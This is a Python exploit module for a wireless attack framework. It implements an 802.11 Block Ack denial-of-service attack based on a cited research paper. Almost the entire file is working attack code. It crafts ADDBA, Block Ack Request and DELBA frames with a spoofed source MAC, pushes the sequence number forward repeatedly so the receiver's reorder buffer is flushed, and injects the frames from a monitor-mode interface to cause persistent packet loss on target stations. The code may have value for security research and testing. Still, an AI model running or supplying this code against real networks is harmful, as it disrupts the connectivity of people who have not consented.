# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """802.11 Block Ack Frame Denial of Service (Bl0ck Attack).

    Exploits a design flaw in the 802.11 Block Ack mechanism as described
    in the research paper (arXiv:2302.05899).  An attacker within WiFi
    range sends crafted Block Ack Request (BAR) and ADDBA Request frames
    that manipulate the receiver's reorder buffer.  By setting the Starting
    Sequence Number (SSN) to values that cause the target to drop all
    buffered frames waiting for reordering, the attacker forces persistent
    packet loss on the victim station.

    The attack is protocol-level and affects any compliant 802.11n/ac/ax
    implementation that uses Block Ack aggregation, regardless of vendor
    or driver.

    CVSS v3.1: ~6.5 (Medium), AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "802.11 Block Ack Frame DoS (Bl0ck Attack)",
        "description": (
            "Exploits the 802.11 Block Ack mechanism to cause denial of "
            "service via crafted BAR and ADDBA frames.  By manipulating "
            "the Starting Sequence Number (SSN) in Block Ack Requests, "
            "the attacker forces the receiver to flush its reorder buffer "
            "and drop all pending aggregated frames, causing persistent "
            "packet loss for the target station."
        ),
        "authors": (
            "Efstratios Chatzoglou et al. (research, arXiv:2302.05899)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://arxiv.org/abs/2302.05899",
            "https://www.ieee802.org/11/",
        ),
        "disclosure_date": "2023-02-10",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Any 802.11n/ac/ax station using Block Ack aggregation",
            "Intel, Qualcomm, Broadcom, MediaTek chipsets",
            "Linux, Windows, macOS, Android, iOS",
        ),
    }

    target = OptIP("", "Target station MAC or BSSID")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    tid = OptInteger(0, "Traffic Identifier (TID) for Block Ack session (0-7)")
    ssn_offset = OptInteger(2048, "SSN jump offset to flush reorder buffer")
    injection_rounds = OptInteger(64, "Number of BAR injection rounds")
    inter_frame_delay = OptFloat(0.005, "Delay between injected frames in seconds")

    _FRAME_TYPE_MGMT = 0x00
    _FRAME_TYPE_CTL = 0x01
    _SUBTYPE_BAR = 0x08
    _SUBTYPE_ACTION = 0x0D
    _SUBTYPE_PROBE_REQ = 0x04

    _ACTION_CATEGORY_BA = 3
    _ACTION_ADDBA_REQUEST = 0
    _ACTION_DELBA = 2

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_SRC = b"\x02\x00\x00\x00\x00\x01"

    def _build_radiotap_header(self) -> bytes:
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_bar_frame(self, src: bytes, dst: bytes, tid: int, ssn: int) -> bytes:
        """Build a Block Ack Request (BAR) control frame.

        The BAR Control field encodes the TID and BAR Type.
        The Starting Sequence Control field sets the SSN that will
        force the receiver to advance its reorder window, dropping
        all frames with sequence numbers below this value.
        """
        fc_low = (self._FRAME_TYPE_CTL & 0x03) | ((self._SUBTYPE_BAR & 0x0F) << 4)
        fc = struct.pack("<BB", fc_low, 0x00)
        duration = struct.pack("<H", 0)
        header = fc + duration + dst + src

        bar_control = struct.pack("<H", ((tid & 0x0F) << 12) | 0x0004)
        start_seq_ctrl = struct.pack("<H", (ssn & 0x0FFF) << 4)
        body = bar_control + start_seq_ctrl

        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_addba_request(self, src: bytes, dst: bytes, tid: int, buf_size: int = 64) -> bytes:
        """Build an ADDBA Request action frame.

        This initiates a new Block Ack session with the target,
        which can then be exploited via BAR SSN manipulation.
        """
        fc_low = (self._FRAME_TYPE_MGMT & 0x03) | ((self._SUBTYPE_ACTION & 0x0F) << 4)
        fc = struct.pack("<BB", fc_low, 0x00)
        duration = struct.pack("<H", 0)
        bssid = dst
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl

        category = struct.pack("B", self._ACTION_CATEGORY_BA)
        action = struct.pack("B", self._ACTION_ADDBA_REQUEST)
        dialog_token = struct.pack("B", 1)

        ba_param = ((tid & 0x0F) << 2) | ((buf_size & 0x03FF) << 6) | 0x0002
        ba_param_set = struct.pack("<H", ba_param)
        ba_timeout = struct.pack("<H", 0)
        ba_ssn = struct.pack("<H", 0)

        body = category + action + dialog_token + ba_param_set + ba_timeout + ba_ssn

        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_delba_frame(self, src: bytes, dst: bytes, tid: int) -> bytes:
        """Build a DELBA action frame to tear down the BA session."""
        fc_low = (self._FRAME_TYPE_MGMT & 0x03) | ((self._SUBTYPE_ACTION & 0x0F) << 4)
        fc = struct.pack("<BB", fc_low, 0x00)
        duration = struct.pack("<H", 0)
        bssid = dst
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl

        category = struct.pack("B", self._ACTION_CATEGORY_BA)
        action = struct.pack("B", self._ACTION_DELBA)
        delba_param = struct.pack("<H", ((tid & 0x0F) << 12) | 0x0800)
        reason = struct.pack("<H", 39)

        body = category + action + delba_param + reason

        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_probe_request(self) -> bytes:
        fc_low = (self._FRAME_TYPE_MGMT & 0x03) | ((self._SUBTYPE_PROBE_REQ & 0x0F) << 4)
        fc = struct.pack("<BB", fc_low, 0x00)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        src = self._FAKE_SRC
        bssid = self._BROADCAST
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        radiotap = self._build_radiotap_header()
        return radiotap + header + ssid_ie + rates_ie

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; injecting Block Ack DoS frames")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        src = self._FAKE_SRC
        dst = self._BROADCAST

        print_status("Phase 1: Sending ADDBA Request to establish BA session")
        addba = self._build_addba_request(src, dst, self.tid)
        self._inject_frame(raw, addba)
        time.sleep(0.1)

        print_status(
            f"Phase 2: Injecting {self.injection_rounds} BAR frames "
            f"with SSN jump offset {self.ssn_offset} on TID {self.tid}"
        )

        success = 0
        current_ssn = 0
        for rnd in range(self.injection_rounds):
            current_ssn = (current_ssn + self.ssn_offset) & 0x0FFF
            bar = self._build_bar_frame(src, dst, self.tid, current_ssn)
            if self._inject_frame(raw, bar):
                success += 1
            if self.inter_frame_delay > 0:
                time.sleep(self.inter_frame_delay)

        print_status("Phase 3: Sending DELBA to disrupt teardown")
        delba = self._build_delba_frame(src, dst, self.tid)
        self._inject_frame(raw, delba)

        raw.close()

        print_status(f"Injected {success}/{self.injection_rounds} BAR frames")
        print_info(
            "If the target station supports Block Ack aggregation, "
            "the SSN jumps forced its reorder buffer to flush pending "
            "frames repeatedly.  This causes persistent packet loss "
            "visible as throughput degradation or connectivity drops."
        )
